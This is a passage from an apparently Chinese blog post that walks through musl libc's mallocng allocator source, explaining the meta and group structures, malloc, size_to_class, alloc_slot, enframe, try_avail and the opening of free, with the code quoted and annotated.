<li><code>uintptr_t sizeclass:6</code>：管理的group的大小。如果mem是mmap分配，固定为63</li>
<li><code>uintptr_t maplen:8*sizeof(uintptr_t)-12</code>：如果管理的group是mmap分配的，则为内存页数，否则为0</li>
</ul>
<h2 id="group"><a class="markdownIt-Anchor" href="#group"></a> group</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">	<span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>group</code>中即保存有需要分配出去的chunk。</p>
<ul>
<li><code>struct meta *meta</code>：所属的<code>meta</code>的地址</li>
<li><code>unsigned char active_idx:5</code>：5个比特，表示还有多少可用chunk</li>
<li><code>char pad[UNIT - sizeof(struct meta *) - 1]</code>：手动16字节对齐</li>
<li><code>unsigned char storage[]</code>：要分配出去的内存空间，chunk</li>
</ul>
<hr />
<p>以上就是musl libc中主要的数据结构，下面我们通过代码审计彻底搞清楚musl libc的内存分配机制。</p>
<h1 id="2-代码审计"><a class="markdownIt-Anchor" href="#2-代码审计"></a> 2. 代码审计</h1>
<p>我们首先从内存分配相关的函数开始看起。对于辅助性的较为复杂的函数使用小标题的形式进行分析，辅助性的较为简单的函数只在第一次出现时直接写到主要函数分析代码中进行简单解释。</p>
<h2 id="mallocsrcmallocmallocngmallocc-line-299"><a class="markdownIt-Anchor" href="#mallocsrcmallocmallocngmallocc-line-299"></a> malloc（<code>/src/malloc/mallocng/malloc.c line 299</code>）</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">	<span class="type">uint32_t</span> mask, first;</span><br><span class="line">	<span class="type">int</span> sc;</span><br><span class="line">	<span class="type">int</span> idx;</span><br><span class="line">	<span class="type">int</span> ctr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="type">size_t</span> needed = n + IB + UNIT;</span><br><span class="line">		<span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		wrlock();</span><br><span class="line">		step_seq();</span><br><span class="line">		g = alloc_meta();</span><br><span class="line">		<span class="keyword">if</span> (!g) &#123;</span><br><span class="line">			unlock();</span><br><span class="line">			munmap(p, needed);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		g-&gt;mem = p;</span><br><span class="line">		g-&gt;mem-&gt;meta = g;</span><br><span class="line">		g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">		g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">		g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">		g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">		g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line">		<span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">		ctx.mmap_counter++;</span><br><span class="line">		idx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sc = size_to_class(n);</span><br><span class="line"></span><br><span class="line">	rdlock();</span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line">	<span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line">	<span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line">	<span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line">	<span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">		<span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line">		<span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">		<span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">		    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">			usage += <span class="number">3</span>;</span><br><span class="line">		<span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">			sc |= <span class="number">1</span>;</span><br><span class="line">		g = ctx.active[sc];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">		first = mask&amp;-mask;</span><br><span class="line">		<span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">			g-&gt;avail_mask = mask-first;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		idx = a_ctz_32(first);</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line">	upgradelock();</span><br><span class="line"></span><br><span class="line">	idx = alloc_slot(sc, n);</span><br><span class="line">	<span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		unlock();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">success:</span><br><span class="line">	ctr = ctx.mmap_counter;</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>MMAP_THRESHOLD</code>等于131052。第一个判断如果为真，说明要分配一块很大的内存。首先计算一共需要的内存大小，这里<code>IB</code>等于4、<code>UNIT</code>等于16。然后使用<code>mmap</code>函数分配一块内存。如果分配成功，上读写锁。后面使用<code>alloc_meta</code>分配一个<code>meta</code>给这块大空间，之后设置这个<code>meta</code>的一些基本信息。</p>
<p>从这个if语句我们可以知道，如果一次内存申请的大小过大，musl libc会为这块空间专门分配一个meta和group，这个meta和group只管理这一个空间。</p>
<p>如果申请的空间较小，则进入下面的代码。</p>
<p><code>sc = size_to_class(n);</code>这条语句是为了计算这个大小的chunk应该被分到哪一个class。</p>
<p>在musl中定义有如下内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /src/malloc/mallocng/malloc.c, line 12</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">	<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">	<span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">	<span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">	<span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">	<span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">	<span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">	<span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">	<span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">	<span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">	<span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">	<span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>size_to_class</code>的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	n = (n+IB<span class="number">-1</span>)&gt;&gt;<span class="number">4</span>;</span><br><span class="line">	<span class="keyword">if</span> (n&lt;<span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">	n++;</span><br><span class="line">	<span class="type">int</span> i = (<span class="number">28</span>-a_clz_32(n))*<span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">	<span class="keyword">if</span> (n&gt;size_classes[i+<span class="number">1</span>]) i+=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (n&gt;size_classes[i]) i++;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中经过试验可知<code>a_clz_32</code>这个函数返回的是n的最高位是32位中的倒数第几高位（最高位为0）。如<code>a_clz_32(1)=31</code>，<code>a_clz_32(2)=30</code>，<code>a_clz_32(4)=29</code>，以此类推。由此我们可以计算出不同大小的chunk对应于哪一个索引。这个部分实际上是将chunk的大小按照数组来进行分组，数组的每一项表示这一组中chunk右移4位的值不能超过多少。如索引为10的数组元素值为12，前面一个元素为10，则第10组chunk的大小范围应该在0x100-0x11F之间。同理，第11组chunk的大小范围为0x120-0x14F。</p>
<p>紧接着，上读写锁。后面<code>g = ctx.active[sc];</code>中的<code>ctx</code>指的是全局<code>__malloc_context</code>，其<code>active</code>数组长度与<code>size_classes</code>的相同，均为48。由此可见，<font color=red><strong>malloc_context将meta以管理的chunk大小进行分组，分组依据<code>size_classes</code>进行。</strong></font></p>
<p>再往下的一个if语句有很多的判断条件，在某些条件成立时会修改<code>meta</code>指针的值，对整体影响不大，先向下看。</p>
<p>下面是一个循环。<code>first = mask&amp;-mask;</code>是取<code>mask</code>的最低1位，即lowbit，这里的<code>avail_mask</code>实际就是选中的<code>meta</code>所管理的<code>group</code>中chunk的可用位，这里是通过可用位来查找第一个可用的chunk。内部的if-else语句是针对读写锁进行的检查，无需关注。如果在这里能够找到可用的chunk，则将chunk的索引保存到<code>idx</code>变量中。</p>
<p>如果在这个循环中没有找到合适的<code>idx</code>，则在循环外调用<code>alloc_slot</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">	<span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">	<span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	g-&gt;avail_mask--;</span><br><span class="line">	<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>try_avail</code>函数尝试从该大小的<code>meta</code>中分配出一个可用的chunk并返回索引，如果该可用chunk不是由位于链首的<code>meta</code>所提供，则会将这个chunk所在的meta移动至链首。如果尝试分配成功，则这里直接返回。否则，后面调用<code>alloc_group</code>函数创建一个新的<code>meta</code>，创建成功后将其中的第一个chunk的索引（即0）返回，并将该<code>meta</code>放在链首。不论如何，最终只要能够执行到标号<code>success</code>，就一定能够获取到<code>idx</code>的值。</p>
<p>最后返回调用了<code>enframe</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">enframe</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> idx, <span class="type">size_t</span> n, <span class="type">int</span> ctr)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="type">size_t</span> slack = (stride-IB-n)/UNIT;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *p = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *end = p+stride-IB;</span><br><span class="line">	<span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line">	<span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line">	<span class="type">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">	assert(!p[<span class="number">-4</span>]);</span><br><span class="line">	<span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line">		<span class="type">size_t</span> m = slack;</span><br><span class="line">		m |= m&gt;&gt;<span class="number">1</span>; m |= m&gt;&gt;<span class="number">2</span>; m |= m&gt;&gt;<span class="number">4</span>;</span><br><span class="line">		off &amp;= m;</span><br><span class="line">		<span class="keyword">if</span> (off &gt; slack) off -= slack+<span class="number">1</span>;</span><br><span class="line">		assert(off &lt;= slack);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (off) &#123;</span><br><span class="line">		<span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line">		<span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">		*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = off;</span><br><span class="line">		p[<span class="number">-3</span>] = <span class="number">7</span>&lt;&lt;<span class="number">5</span>;</span><br><span class="line">		p += UNIT*off;</span><br><span class="line">		<span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line">		<span class="comment">// byte, so make one.</span></span><br><span class="line">		p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = (<span class="type">size_t</span>)(p-g-&gt;mem-&gt;storage)/UNIT;</span><br><span class="line">	p[<span class="number">-3</span>] = idx;</span><br><span class="line">	set_size(p, end, n);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的主要作用是从指定<code>meta</code>中取出指定索引的<code>chunk</code>。</p>
<h2 id="try_availsrcmallocmallocngmallocc-line-114"><a class="markdownIt-Anchor" href="#try_availsrcmallocmallocngmallocc-line-114"></a> try_avail（<code>/src/malloc/mallocng/malloc.c, line 114</code>）</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">	<span class="type">uint32_t</span> first;</span><br><span class="line">	<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">	<span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">			dequeue(pm, m);</span><br><span class="line">			m = *pm;</span><br><span class="line">			<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			m = m-&gt;next;</span><br><span class="line">			*pm = m;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		mask = m-&gt;freed_mask;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line">		<span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line">		<span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">			m = m-&gt;next;</span><br><span class="line">			*pm = m;</span><br><span class="line">			mask = m-&gt;freed_mask;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">		<span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">		<span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">		<span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">		<span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>))) &#123;</span><br><span class="line">			<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">				m = m-&gt;next;</span><br><span class="line">				*pm = m;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">				<span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">				<span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line">				<span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">				<span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">					cnt++;</span><br><span class="line">					span += size;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">					cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">				m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		mask = activate_group(m);</span><br><span class="line">		assert(mask);</span><br><span class="line">		decay_bounces(m-&gt;sizeclass);</span><br><span class="line">	&#125;</span><br><span class="line">	first = mask&amp;-mask;</span><br><span class="line">	m-&gt;avail_mask = mask-first;</span><br><span class="line">	<span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过查找，这个函数只在<code>alloc_slot</code>这一处被调用，参数填的是一个<code>meta</code>链表的链首地址指针。</p>
<p>这个函数的参数是<code>meta</code>的二重指针，首先解引用一层获取到<code>meta</code>指针，如果这个<code>meta</code>指针无效，则返回0。</p>
<p>如果该<code>meta</code>存在，则取出其<code>avail_mask</code>。如果这个值为0，说明这个<code>meta</code>中已经没有可以用来分配的chunk了。这就进入到大if语句体内：</p>
<p><strong><code>free_mask</code>与<code>avail_mask</code>相同，以比特位标识，每一个比特位表示一个chunk是否被释放。如被释放则比特值为1</strong>。<mark>如果<code>free_mask</code>为0</mark>，而此时<code>avail_mask</code>也为1，说明这个<code>meta</code>中既不能分配<code>chunk</code>，也没有已经释放的<code>chunk</code>，这种情况下应该将这个<code>meta</code>从链表中移除，即调用<code>dequeue</code>函数脱链。脱链之后<code>pm</code>应该指向新的链首<code>meta</code>指针。如果链表中没有其他<code>meta</code>，就返回0。<mark>如果<code>free_mask</code>不为0</mark>，则找到下一个<code>meta</code>，并将链首修改为这个<code>meta</code>。</p>
<p>之后检查新链首<code>meta</code>中的chunk是否全部被释放且该<code>meta</code>不是不可释放的。这里的<code>mask == (2u&lt;&lt;m-&gt;last_idx)-1</code>就是在判断<code>free_mask</code>的所有有效的比特是不是全为1，如果是则跳过该chunk并再次修改链首的<code>meta</code>为下一个<code>meta</code>。</p>
<p>下面是<code>if (!(mask &amp; ((2u&lt;&lt;m-&gt;mem-&gt;active_idx)-1)))</code>，<code>mask</code>是释放chunk的掩码，后面是全1的掩码，如果两者相与等于0，说明这个<code>meta</code>中没有chunk被释放。这个if语句是想要尽可能地使用已经有chunk被释放的<code>meta</code>而尽可能保留全部chunk都可以使用的<code>meta</code>，这样做的目的是减少脏页面的产生。内部判断如果这个<code>meta</code>不是仅有的一个<code>meta</code>，则使用下一个<code>meta</code>，否则没办法就只能使用这个“干净的”<code>meta</code>，else中所做的是在<code>group</code>中选择一个可以使用的chunk并设置相应控制位。</p>
<p>循环外面，是设置<code>meta</code>的<code>avail_mask</code>位，并返回将要分配出去的chunk索引。</p>
<h2 id="freesrcmallocmallocngfreec-line-101"><a class="markdownIt-Anchor" href="#freesrcmallocmallocngfreec-line-101"></a> free（<code>/src/malloc/mallocng/free.c, line 101</code>）</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line">	<span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">	<span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">	get_nominal_size(p, end);</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">	((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">	<span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line">	<span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">	*(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line">	<span class="comment">// unless it&#x27;s a single-slot group that will be 